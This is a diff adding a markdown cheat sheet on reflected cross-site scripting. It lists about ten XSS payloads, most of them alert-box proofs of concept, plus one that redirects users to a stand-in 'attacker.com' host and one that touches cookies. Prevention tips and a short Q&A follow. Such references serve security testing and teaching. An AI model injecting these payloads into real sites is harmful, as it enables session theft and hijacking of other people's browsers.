@@ -1,3 +1,65 @@
+# XSS
+## Reflected XSS :
+- Universal : `"><img src=x onerror=alert('XSS')>`
+- Simple Alert Box : `<script>alert(document.cookies)</script>`
+- Using HTML Tags : `<img src="x" onerror="alert('XSS')">`
+- Using SVG Tag : `<svg/onload=alert('XSS')>`
+- Using JavaScript Events : `<body onload=alert('XSS')>`
+- Case Manipulation : `<ScRiPt>alert('XSS')</ScRiPt>`
+- Using Double Quotes : `"<script>alert('XSS')</script>`
+- Using JavaScript Protocol : `<a href="javascript:alert('XSS')">Click Me</a>`
+- Using Event Handlers : '<input type="text" value="" onfocus=alert('XSS') autofocus>'
+- Redirecting the User : `<script>window.location='http://attacker.com'</script>`
+- 
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### Prevention of Reflected XSS:
+- Input Validation: Validate and sanitize all user inputs.
+
+- Output Encoding: Encode data before rendering it in the browser.
+
+- Content Security Policy (CSP): Implement CSP to restrict the execution of unauthorized scripts.
+
+- Use Secure Frameworks: Leverage frameworks that automatically handle XSS protections.
+
+### Common questions about reflected cross-site scripting
+
+- What is the difference between reflected XSS and stored XSS? 
+Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way.
+
+- What is the difference between reflected XSS and self-XSS?
+  Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.
+
+
+# --------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
 # basic payload
 
 # try
